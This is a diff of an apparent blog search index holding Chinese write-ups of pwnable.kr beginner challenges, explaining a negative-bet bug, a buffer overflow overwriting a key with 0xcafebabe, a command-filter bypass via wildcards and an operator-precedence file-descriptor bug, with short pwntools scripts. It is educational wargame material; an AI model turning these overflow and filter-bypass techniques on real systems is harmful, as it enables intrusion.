@@ -90,6 +90,52 @@
       </tags>
   </entry>
   <entry>
+    <title>blackjack</title>
+    <url>/xiaohong404.github.io/2020/10/19/Pwnable_kr/blackjack/</url>
+    <content><![CDATA[<p><strong><img src="/xiaohong404.github.io/2020/10/19/Pwnable_kr/blackjack/0.png" class></strong></p>
+ <a id="more"></a>
+
+<p><strong><img src="/xiaohong404.github.io/2020/10/19/Pwnable_kr/blackjack/1.png" class></strong></p>
+<h3 id="思路分析"><a href="#思路分析" class="headerlink" title="思路分析"></a>思路分析</h3><p>本题链接打不开了！！！ 只能参考别人的wp</p>
+<p>有两个比较关键的点</p>
+<p><strong><img src="/xiaohong404.github.io/2020/10/19/Pwnable_kr/blackjack/2.png" class></strong></p>
+<p>判断用户下注的金额如果大于用户拥有的金额，则会提示用户不能下注，但程序的漏洞在于如果输入的金额是负数，会直接通过，并且返回输入的下注金额。</p>
+<p><strong><img src="/xiaohong404.github.io/2020/10/19/Pwnable_kr/blackjack/3.png" class></strong></p>
+<p>如果用户输了，则会扣除用户下注的金额，这里使用简单的减法操作，结合前面下注金额可以为负数，则直接输入一个很大的负数，之后故意输掉比赛，使得金额超过阈值拿到flag。</p>
+<h3 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h3><p><strong><img src="/xiaohong404.github.io/2020/10/19/Pwnable_kr/blackjack/4.png" class></strong></p>
+]]></content>
+      <categories>
+        <category>PWN</category>
+        <category>Pwnable.kr</category>
+        <category>Toddler&#39;s Bottle</category>
+      </categories>
+      <tags>
+        <tag>PWN</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>bof</title>
+    <url>/xiaohong404.github.io/2020/10/15/Pwnable_kr/bof/</url>
+    <content><![CDATA[<p><strong><img src="/xiaohong404.github.io/2020/10/15/Pwnable_kr/bof/4.png" class></strong></p>
+ <a id="more"></a>
+
+<p><strong><img src="/xiaohong404.github.io/2020/10/15/Pwnable_kr/bof/1.png" class></strong></p>
+<h3 id="查看给出的c语言源代码"><a href="#查看给出的c语言源代码" class="headerlink" title="查看给出的c语言源代码"></a>查看给出的c语言源代码</h3><p><strong><img src="/xiaohong404.github.io/2020/10/15/Pwnable_kr/bof/2.png" class></strong></p>
+<p>显然，简单的缓冲区溢出，将key通过缓冲区溢出覆盖为0xcafebabe，即可通过判断条件，执行system函数。</p>
+<h3 id="IDA32打开文件"><a href="#IDA32打开文件" class="headerlink" title="IDA32打开文件"></a>IDA32打开文件</h3><p><strong><img src="/xiaohong404.github.io/2020/10/15/Pwnable_kr/bof/3.png" class></strong></p>
+<h3 id="编写python脚本"><a href="#编写python脚本" class="headerlink" title="编写python脚本"></a>编写python脚本</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io = remote(<span class="string">&#x27;pwnable.kr&#x27;</span>,<span class="number">9000</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x2C</span> + <span class="string">&#x27;junk&#x27;</span> + <span class="string">&#x27;junk&#x27;</span> + p32(<span class="number">0xcafebabe</span>)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+]]></content>
+      <categories>
+        <category>PWN</category>
+        <category>Pwnable.kr</category>
+        <category>Toddler&#39;s Bottle</category>
+      </categories>
+      <tags>
+        <tag>PWN</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>阅读深度学习的对抗攻击方法综述及实例</title>
     <url>/xiaohong404.github.io/2020/10/22/AI%E5%AE%89%E5%85%A8/%E9%98%85%E8%AF%BB%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0%E7%9A%84%E5%AF%B9%E6%8A%97%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95%E7%BB%BC%E8%BF%B0%E5%8F%8A%E5%AE%9E%E4%BE%8B/</url>
     <content><![CDATA[<p><strong><img src="/xiaohong404.github.io/2020/10/22/AI%E5%AE%89%E5%85%A8/%E9%98%85%E8%AF%BB%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0%E7%9A%84%E5%AF%B9%E6%8A%97%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95%E7%BB%BC%E8%BF%B0%E5%8F%8A%E5%AE%9E%E4%BE%8B/0.png" class></strong></p>
@@ -150,73 +196,6 @@
       </tags>
   </entry>
   <entry>
-    <title>blackjack</title>
-    <url>/xiaohong404.github.io/2020/10/19/Pwnable_kr/blackjack/</url>
-    <content><![CDATA[<p><strong><img src="/xiaohong404.github.io/2020/10/19/Pwnable_kr/blackjack/0.png" class></strong></p>
- <a id="more"></a>
-
-<p><strong><img src="/xiaohong404.github.io/2020/10/19/Pwnable_kr/blackjack/1.png" class></strong></p>
-<h3 id="思路分析"><a href="#思路分析" class="headerlink" title="思路分析"></a>思路分析</h3><p>本题链接打不开了！！！ 只能参考别人的wp</p>
-<p>有两个比较关键的点</p>
-<p><strong><img src="/xiaohong404.github.io/2020/10/19/Pwnable_kr/blackjack/2.png" class></strong></p>
-<p>判断用户下注的金额如果大于用户拥有的金额，则会提示用户不能下注，但程序的漏洞在于如果输入的金额是负数，会直接通过，并且返回输入的下注金额。</p>
-<p><strong><img src="/xiaohong404.github.io/2020/10/19/Pwnable_kr/blackjack/3.png" class></strong></p>
-<p>如果用户输了，则会扣除用户下注的金额，这里使用简单的减法操作，结合前面下注金额可以为负数，则直接输入一个很大的负数，之后故意输掉比赛，使得金额超过阈值拿到flag。</p>
-<h3 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h3><p><strong><img src="/xiaohong404.github.io/2020/10/19/Pwnable_kr/blackjack/4.png" class></strong></p>
-]]></content>
-      <categories>
-        <category>PWN</category>
-        <category>Pwnable.kr</category>
-        <category>Toddler&#39;s Bottle</category>
-      </categories>
-      <tags>
-        <tag>PWN</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>bof</title>
-    <url>/xiaohong404.github.io/2020/10/15/Pwnable_kr/bof/</url>
-    <content><![CDATA[<p><strong><img src="/xiaohong404.github.io/2020/10/15/Pwnable_kr/bof/4.png" class></strong></p>
- <a id="more"></a>
-
-<p><strong><img src="/xiaohong404.github.io/2020/10/15/Pwnable_kr/bof/1.png" class></strong></p>
-<h3 id="查看给出的c语言源代码"><a href="#查看给出的c语言源代码" class="headerlink" title="查看给出的c语言源代码"></a>查看给出的c语言源代码</h3><p><strong><img src="/xiaohong404.github.io/2020/10/15/Pwnable_kr/bof/2.png" class></strong></p>
-<p>显然，简单的缓冲区溢出，将key通过缓冲区溢出覆盖为0xcafebabe，即可通过判断条件，执行system函数。</p>
-<h3 id="IDA32打开文件"><a href="#IDA32打开文件" class="headerlink" title="IDA32打开文件"></a>IDA32打开文件</h3><p><strong><img src="/xiaohong404.github.io/2020/10/15/Pwnable_kr/bof/3.png" class></strong></p>
-<h3 id="编写python脚本"><a href="#编写python脚本" class="headerlink" title="编写python脚本"></a>编写python脚本</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io = remote(<span class="string">&#x27;pwnable.kr&#x27;</span>,<span class="number">9000</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x2C</span> + <span class="string">&#x27;junk&#x27;</span> + <span class="string">&#x27;junk&#x27;</span> + p32(<span class="number">0xcafebabe</span>)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
-
-]]></content>
-      <categories>
-        <category>PWN</category>
-        <category>Pwnable.kr</category>
-        <category>Toddler&#39;s Bottle</category>
-      </categories>
-      <tags>
-        <tag>PWN</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>cmd1</title>
-    <url>/xiaohong404.github.io/2020/10/20/Pwnable_kr/cmd1/</url>
-    <content><![CDATA[<p><strong><img src="/xiaohong404.github.io/2020/10/20/Pwnable_kr/cmd1/0.png" class></strong></p>
- <a id="more"></a>
-
-<p><strong><img src="/xiaohong404.github.io/2020/10/20/Pwnable_kr/cmd1/1.png" class></strong></p>
-<h3 id="查看cmd1-c源代码"><a href="#查看cmd1-c源代码" class="headerlink" title="查看cmd1.c源代码"></a>查看cmd1.c源代码</h3><p><strong><img src="/xiaohong404.github.io/2020/10/20/Pwnable_kr/cmd1/2.png" class></strong></p>
-<p><a href="https://man7.org/linux/man-pages/man3/putenv.3.html">putenv函数</a>是添加或者改变一个环境变量。</p>
-<p>filter函数的作用是通过<a href="https://blog.csdn.net/qq_21792169/article/details/51147489">strstr函数</a>匹配$flag、sh、tmp$三个字符串，如果检测到这三个字符串，则函数返回值不为0，会导致主函数退出，无法执行system函数。所以这里需要将我们输入的字符串隐藏起来，绕过filter函数的检查，但这里我们需要得到flag。又不能直接输入flag，于是想到可以使用通配符来代替flag。system命令的默认PWD环境变量应该是与这个程序的PWD环境变量相同，这个环境变量是什么，就是默认“./”执行的文件夹目录，一般是根据程序调用的bash窗口目录来的。</p>
-<h3 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h3><p><strong><img src="/xiaohong404.github.io/2020/10/20/Pwnable_kr/cmd1/3.png" class></strong></p>
-]]></content>
-      <categories>
-        <category>PWN</category>
-        <category>Pwnable.kr</category>
-        <category>Toddler&#39;s Bottle</category>
-      </categories>
-      <tags>
-        <tag>PWN</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>cmd2</title>
     <url>/xiaohong404.github.io/2020/10/20/Pwnable_kr/cmd2/</url>
     <content><![CDATA[<p><strong><img src="/xiaohong404.github.io/2020/10/20/Pwnable_kr/cmd2/0.png" class></strong></p>
@@ -246,19 +225,16 @@
       </tags>
   </entry>
   <entry>
-    <title>coin</title>
-    <url>/xiaohong404.github.io/2020/10/18/Pwnable_kr/coin/</url>
-    <content><![CDATA[<p><strong><img src="/xiaohong404.github.io/2020/10/18/Pwnable_kr/coin/0.png" class></strong></p>
+    <title>cmd1</title>
+    <url>/xiaohong404.github.io/2020/10/20/Pwnable_kr/cmd1/</url>
+    <content><![CDATA[<p><strong><img src="/xiaohong404.github.io/2020/10/20/Pwnable_kr/cmd1/0.png" class></strong></p>
  <a id="more"></a>
 
-<p><strong><img src="/xiaohong404.github.io/2020/10/18/Pwnable_kr/coin/3.png" class></strong></p>
-<h3 id="使用netcat连接上远程的服务器"><a href="#使用netcat连接上远程的服务器" class="headerlink" title="使用netcat连接上远程的服务器"></a>使用netcat连接上远程的服务器</h3><p><strong><img src="/xiaohong404.github.io/2020/10/18/Pwnable_kr/coin/1.png" class></strong></p>
-<p>题目是一个游戏，大致意思是，一堆硬币，有一个假币，重量为9，而其他为10，要通过给定的C次机会内找到假币。一共要在30s内找到100个假币，也就是完成100次游戏，最终会给出flag。</p>
-<h3 id="思路分析"><a href="#思路分析" class="headerlink" title="思路分析"></a>思路分析</h3><p>简单的二分法，但这里不能从本地直接连远程服务器，这样会超时，需要通过之前的连接登录远程服务器，之后在服务器上编写脚本运行，下面的代码即可成功运行：</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;localhost&#x27;</span>, <span class="number">9007</span>)</span><br><span class="line">print(p.recv())</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">100</span>):</span><br><span class="line">	N, C = re.findall(<span class="string">&quot;N=(\d+) C=(\d+)&quot;</span>, p.recv())[<span class="number">0</span>]</span><br><span class="line">	N = int(N)</span><br><span class="line">	C = int(C)</span><br><span class="line">	print(N, C)</span><br><span class="line"></span><br><span class="line">	start, end = <span class="number">0</span>, N<span class="number">-1</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">while</span> start &lt;= end <span class="keyword">and</span> C &gt; <span class="number">0</span>:</span><br><span class="line">		mid = (start + end) // <span class="number">2</span></span><br><span class="line">		x = <span class="string">&quot; &quot;</span>.join([str(j) <span class="keyword">for</span> j <span class="keyword">in</span> range(start, mid+<span class="number">1</span>)])	<span class="comment"># build range list</span></span><br><span class="line">		p.sendline(x)</span><br><span class="line">		</span><br><span class="line">		res = int(p.recvline()[:<span class="number">-1</span>])</span><br><span class="line">		<span class="keyword">if</span> res % <span class="number">10</span> == <span class="number">0</span>:</span><br><span class="line">			start = mid+<span class="number">1</span>	<span class="comment"># through first half</span></span><br><span class="line">		<span class="keyword">else</span>:</span><br><span class="line">			end = mid<span class="number">-1</span>		<span class="comment"># through second half</span></span><br><span class="line">		C -= <span class="number">1</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">while</span> C &gt; <span class="number">0</span>:	<span class="comment"># use all the tries</span></span><br><span class="line">		p.sendline(<span class="string">&quot;0&quot;</span>)</span><br><span class="line">		p.recv(<span class="number">1024</span>)</span><br><span class="line">		C -= <span class="number">1</span></span><br><span class="line"></span><br><span class="line">	p.sendline(str(start))	<span class="comment"># final answer</span></span><br><span class="line">	print(p.recv())</span><br><span class="line"></span><br><span class="line">print(p.recv())</span><br></pre></td></tr></table></figure>
-
-<p>注意这里有个细节是需要先进入服务器的/tmp文件夹下，之后自己再主动建立一个新的文件夹，否则会没有权限访问python的库，一直提示未定义的错误。之后在这个新的文件夹下建立一个python文件，可以随便取个名字，这里我就命名为coin.py。</p>
-<h3 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h3><p><strong><img src="/xiaohong404.github.io/2020/10/18/Pwnable_kr/coin/2.png" class></strong></p>
+<p><strong><img src="/xiaohong404.github.io/2020/10/20/Pwnable_kr/cmd1/1.png" class></strong></p>
+<h3 id="查看cmd1-c源代码"><a href="#查看cmd1-c源代码" class="headerlink" title="查看cmd1.c源代码"></a>查看cmd1.c源代码</h3><p><strong><img src="/xiaohong404.github.io/2020/10/20/Pwnable_kr/cmd1/2.png" class></strong></p>
+<p><a href="https://man7.org/linux/man-pages/man3/putenv.3.html">putenv函数</a>是添加或者改变一个环境变量。</p>
+<p>filter函数的作用是通过<a href="https://blog.csdn.net/qq_21792169/article/details/51147489">strstr函数</a>匹配$flag、sh、tmp$三个字符串，如果检测到这三个字符串，则函数返回值不为0，会导致主函数退出，无法执行system函数。所以这里需要将我们输入的字符串隐藏起来，绕过filter函数的检查，但这里我们需要得到flag。又不能直接输入flag，于是想到可以使用通配符来代替flag。system命令的默认PWD环境变量应该是与这个程序的PWD环境变量相同，这个环境变量是什么，就是默认“./”执行的文件夹目录，一般是根据程序调用的bash窗口目录来的。</p>
+<h3 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h3><p><strong><img src="/xiaohong404.github.io/2020/10/20/Pwnable_kr/cmd1/3.png" class></strong></p>
 ]]></content>
       <categories>
         <category>PWN</category>
@@ -305,6 +281,52 @@
       </tags>
   </entry>
   <entry>
+    <title>coin</title>
+    <url>/xiaohong404.github.io/2020/10/18/Pwnable_kr/coin/</url>
+    <content><![CDATA[<p><strong><img src="/xiaohong404.github.io/2020/10/18/Pwnable_kr/coin/0.png" class></strong></p>
+ <a id="more"></a>
+
+<p><strong><img src="/xiaohong404.github.io/2020/10/18/Pwnable_kr/coin/3.png" class></strong></p>
+<h3 id="使用netcat连接上远程的服务器"><a href="#使用netcat连接上远程的服务器" class="headerlink" title="使用netcat连接上远程的服务器"></a>使用netcat连接上远程的服务器</h3><p><strong><img src="/xiaohong404.github.io/2020/10/18/Pwnable_kr/coin/1.png" class></strong></p>
+<p>题目是一个游戏，大致意思是，一堆硬币，有一个假币，重量为9，而其他为10，要通过给定的C次机会内找到假币。一共要在30s内找到100个假币，也就是完成100次游戏，最终会给出flag。</p>
+<h3 id="思路分析"><a href="#思路分析" class="headerlink" title="思路分析"></a>思路分析</h3><p>简单的二分法，但这里不能从本地直接连远程服务器，这样会超时，需要通过之前的连接登录远程服务器，之后在服务器上编写脚本运行，下面的代码即可成功运行：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;localhost&#x27;</span>, <span class="number">9007</span>)</span><br><span class="line">print(p.recv())</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">100</span>):</span><br><span class="line">	N, C = re.findall(<span class="string">&quot;N=(\d+) C=(\d+)&quot;</span>, p.recv())[<span class="number">0</span>]</span><br><span class="line">	N = int(N)</span><br><span class="line">	C = int(C)</span><br><span class="line">	print(N, C)</span><br><span class="line"></span><br><span class="line">	start, end = <span class="number">0</span>, N<span class="number">-1</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">while</span> start &lt;= end <span class="keyword">and</span> C &gt; <span class="number">0</span>:</span><br><span class="line">		mid = (start + end) // <span class="number">2</span></span><br><span class="line">		x = <span class="string">&quot; &quot;</span>.join([str(j) <span class="keyword">for</span> j <span class="keyword">in</span> range(start, mid+<span class="number">1</span>)])	<span class="comment"># build range list</span></span><br><span class="line">		p.sendline(x)</span><br><span class="line">		</span><br><span class="line">		res = int(p.recvline()[:<span class="number">-1</span>])</span><br><span class="line">		<span class="keyword">if</span> res % <span class="number">10</span> == <span class="number">0</span>:</span><br><span class="line">			start = mid+<span class="number">1</span>	<span class="comment"># through first half</span></span><br><span class="line">		<span class="keyword">else</span>:</span><br><span class="line">			end = mid<span class="number">-1</span>		<span class="comment"># through second half</span></span><br><span class="line">		C -= <span class="number">1</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">while</span> C &gt; <span class="number">0</span>:	<span class="comment"># use all the tries</span></span><br><span class="line">		p.sendline(<span class="string">&quot;0&quot;</span>)</span><br><span class="line">		p.recv(<span class="number">1024</span>)</span><br><span class="line">		C -= <span class="number">1</span></span><br><span class="line"></span><br><span class="line">	p.sendline(str(start))	<span class="comment"># final answer</span></span><br><span class="line">	print(p.recv())</span><br><span class="line"></span><br><span class="line">print(p.recv())</span><br></pre></td></tr></table></figure>
+
+<p>注意这里有个细节是需要先进入服务器的/tmp文件夹下，之后自己再主动建立一个新的文件夹，否则会没有权限访问python的库，一直提示未定义的错误。之后在这个新的文件夹下建立一个python文件，可以随便取个名字，这里我就命名为coin.py。</p>
+<h3 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h3><p><strong><img src="/xiaohong404.github.io/2020/10/18/Pwnable_kr/coin/2.png" class></strong></p>
+]]></content>
+      <categories>
+        <category>PWN</category>
+        <category>Pwnable.kr</category>
+        <category>Toddler&#39;s Bottle</category>
+      </categories>
+      <tags>
+        <tag>PWN</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>flag</title>
+    <url>/xiaohong404.github.io/2020/10/15/Pwnable_kr/flag/</url>
+    <content><![CDATA[<p><strong><img src="/xiaohong404.github.io/2020/10/15/Pwnable_kr/flag/1.png" class></strong></p>
+ <a id="more"></a>
+
+<p><strong><img src="/xiaohong404.github.io/2020/10/15/Pwnable_kr/flag/2.png" class></strong></p>
+<h3 id="checksec查看文件属性"><a href="#checksec查看文件属性" class="headerlink" title="checksec查看文件属性"></a>checksec查看文件属性</h3><p><strong><img src="/xiaohong404.github.io/2020/10/15/Pwnable_kr/flag/3.png" class></strong></p>
+<h3 id="windows下使用upx-d命令解压缩"><a href="#windows下使用upx-d命令解压缩" class="headerlink" title="windows下使用upx -d命令解压缩"></a>windows下使用upx -d命令解压缩</h3><p><strong><img src="/xiaohong404.github.io/2020/10/15/Pwnable_kr/flag/4.png" class></strong></p>
+<h3 id="IDA64打开解压缩的文件"><a href="#IDA64打开解压缩的文件" class="headerlink" title="IDA64打开解压缩的文件"></a>IDA64打开解压缩的文件</h3><p><strong><img src="/xiaohong404.github.io/2020/10/15/Pwnable_kr/flag/5.png" class></strong></p>
+<p>将flag的值存放到dest中，直接查看flag即可</p>
+<p><strong><img src="/xiaohong404.github.io/2020/10/15/Pwnable_kr/flag/6.png" class></strong></p>
+]]></content>
+      <categories>
+        <category>PWN</category>
+        <category>Pwnable.kr</category>
+        <category>Toddler&#39;s Bottle</category>
+      </categories>
+      <tags>
+        <tag>PWN</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>fd</title>
     <url>/xiaohong404.github.io/2020/10/15/Pwnable_kr/fd/</url>
     <content><![CDATA[<p><strong><img src="/xiaohong404.github.io/2020/10/15/Pwnable_kr/fd/1.png" class></strong></p>
@@ -340,17 +362,23 @@
       </tags>
   </entry>
   <entry>
-    <title>flag</title>
-    <url>/xiaohong404.github.io/2020/10/15/Pwnable_kr/flag/</url>
-    <content><![CDATA[<p><strong><img src="/xiaohong404.github.io/2020/10/15/Pwnable_kr/flag/1.png" class></strong></p>
+    <title>mistake</title>
+    <url>/xiaohong404.github.io/2020/10/18/Pwnable_kr/mistake/</url>
+    <content><![CDATA[<p><strong><img src="/xiaohong404.github.io/2020/10/18/Pwnable_kr/mistake/0.png" class></strong></p>
  <a id="more"></a>
 
-<p><strong><img src="/xiaohong404.github.io/2020/10/15/Pwnable_kr/flag/2.png" class></strong></p>
-<h3 id="checksec查看文件属性"><a href="#checksec查看文件属性" class="headerlink" title="checksec查看文件属性"></a>checksec查看文件属性</h3><p><strong><img src="/xiaohong404.github.io/2020/10/15/Pwnable_kr/flag/3.png" class></strong></p>
-<h3 id="windows下使用upx-d命令解压缩"><a href="#windows下使用upx-d命令解压缩" class="headerlink" title="windows下使用upx -d命令解压缩"></a>windows下使用upx -d命令解压缩</h3><p><strong><img src="/xiaohong404.github.io/2020/10/15/Pwnable_kr/flag/4.png" class></strong></p>
-<h3 id="IDA64打开解压缩的文件"><a href="#IDA64打开解压缩的文件" class="headerlink" title="IDA64打开解压缩的文件"></a>IDA64打开解压缩的文件</h3><p><strong><img src="/xiaohong404.github.io/2020/10/15/Pwnable_kr/flag/5.png" class></strong></p>
-<p>将flag的值存放到dest中，直接查看flag即可</p>
-<p><strong><img src="/xiaohong404.github.io/2020/10/15/Pwnable_kr/flag/6.png" class></strong></p>
+<p><strong><img src="/xiaohong404.github.io/2020/10/18/Pwnable_kr/mistake/1.png" class></strong></p>
+<h3 id="查看mistake-c源文件"><a href="#查看mistake-c源文件" class="headerlink" title="查看mistake.c源文件"></a>查看mistake.c源文件</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PW_LEN 10</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> XORKEY 1</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">xor</span><span class="params">(<span class="keyword">char</span>* s, <span class="keyword">int</span> len)</span></span>&#123;</span><br><span class="line">        <span class="keyword">int</span> i;</span><br><span class="line">        <span class="keyword">for</span>(i=<span class="number">0</span>; i&lt;len; i++)&#123;</span><br><span class="line">                s[i] ^= XORKEY;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span></span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">int</span> fd;</span><br><span class="line">        <span class="keyword">if</span>(fd=open(<span class="string">&quot;/home/mistake/password&quot;</span>,O_RDONLY,<span class="number">0400</span>) &lt; <span class="number">0</span>)&#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;can&#x27;t open password %d\n&quot;</span>, fd);</span><br><span class="line">                <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;do not bruteforce...\n&quot;</span>);</span><br><span class="line">        sleep(time(<span class="number">0</span>)%<span class="number">20</span>);</span><br><span class="line">		</span><br><span class="line">		<span class="keyword">char</span> pw_buf[PW_LEN+<span class="number">1</span>];</span><br><span class="line">        <span class="keyword">int</span> len;</span><br><span class="line">        <span class="keyword">if</span>(!(len=read(fd,pw_buf,PW_LEN) &gt; <span class="number">0</span>))&#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;read error\n&quot;</span>);</span><br><span class="line">                close(fd);</span><br><span class="line">                <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">char</span> pw_buf2[PW_LEN+<span class="number">1</span>];</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;input password : &quot;</span>);</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%10s&quot;</span>, pw_buf2);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// xor your input</span></span><br><span class="line">        <span class="keyword">xor</span>(pw_buf2, <span class="number">10</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!<span class="built_in">strncmp</span>(pw_buf, pw_buf2, PW_LEN))&#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;Password OK\n&quot;</span>);</span><br><span class="line">                system(<span class="string">&quot;/bin/cat flag\n&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    	<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;Wrong Password\n&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        close(fd);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>整个程序的执行逻辑为，打开系统目录下保存密码的文件，之后开辟了一个数组读取该密码文件中的密码并保存，之后由用户输入10字节长的密码，存放到一个新的数组中，将用户输入的密码进行与$0x1$进行异或（按位取反）操作，之后将两个数组的内容进行比较，如果数组中的内容相同，则验证通过，可执行system函数拿到flag。</p>
+<h3 id="思路分析"><a href="#思路分析" class="headerlink" title="思路分析"></a>思路分析</h3><p>最自然的想法是直接爆破10位用户的密码，但代码中打印“do not bruteforce”，并且在题目中提示<em>operator priority</em>，因此审查源代码中存在两个运算符以上的语句：</p>
+<p><strong><img src="/xiaohong404.github.io/2020/10/18/Pwnable_kr/mistake/2.png" class></strong></p>
+<p>这里$&lt;$运算符的优先级高于$=$运算符，因此实际上fd最终并不是理想的文件描述符，而是0才对。这里的正确写法如下：</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>((fd=open(<span class="string">&quot;/home/mistake/password&quot;</span>,O_RDONLY,<span class="number">0400</span>)) &lt; <span class="number">0</span>)</span><br></pre></td></tr></table></figure>
+
+<p>而另一方面，<strong>0作为文件描述符，它指向的是stdin</strong>。</p>
+<p>因此，后面的read函数实际上是从stdin读取，而不是password文件，而stdin我们可以控制，则我们可以输入任意已知的密码，之后再输入与$0x1$异或的值，使得两次输入的密码相匹配。</p>
+<h3 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h3><p><strong><img src="/xiaohong404.github.io/2020/10/18/Pwnable_kr/mistake/3.png" class></strong></p>
 ]]></content>
       <categories>
         <category>PWN</category>
@@ -375,34 +403,6 @@
 <p>判断用户输入的字符和随机数是否相同本应该是一重for循环，而这里使用了两重for循环，判断的是要求的每一位只要我们输入的6位中存在就可以了，不管是哪一位都可以，只要有六个相等就好了。那只需要一直尝试同一个字符串，总有一次人品好。另外，注意这里随机生成的字符ASCII码范围为1~45，参照<a href="https://blog.csdn.net/jinduozhao/article/details/75398793">ASCII码表</a>，只有 DEC 33 开始才是可见字符，所以需要输入的字符为 ASCII DEC 33 到 45 。</p>
 <h3 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h3><p>可以编写python脚本，也可以直接自己多次重复输入。</p>
 <p><strong><img src="/xiaohong404.github.io/2020/10/19/Pwnable_kr/lotto/3.png" class></strong></p>
-]]></content>
-      <categories>
-        <category>PWN</category>
-        <category>Pwnable.kr</category>
-        <category>Toddler&#39;s Bottle</category>
-      </categories>
-      <tags>
-        <tag>PWN</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>mistake</title>
-    <url>/xiaohong404.github.io/2020/10/18/Pwnable_kr/mistake/</url>
-    <content><![CDATA[<p><strong><img src="/xiaohong404.github.io/2020/10/18/Pwnable_kr/mistake/0.png" class></strong></p>
- <a id="more"></a>
-
-<p><strong><img src="/xiaohong404.github.io/2020/10/18/Pwnable_kr/mistake/1.png" class></strong></p>
-<h3 id="查看mistake-c源文件"><a href="#查看mistake-c源文件" class="headerlink" title="查看mistake.c源文件"></a>查看mistake.c源文件</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PW_LEN 10</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> XORKEY 1</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">xor</span><span class="params">(<span class="keyword">char</span>* s, <span class="keyword">int</span> len)</span></span>&#123;</span><br><span class="line">        <span class="keyword">int</span> i;</span><br><span class="line">        <span class="keyword">for</span>(i=<span class="number">0</span>; i&lt;len; 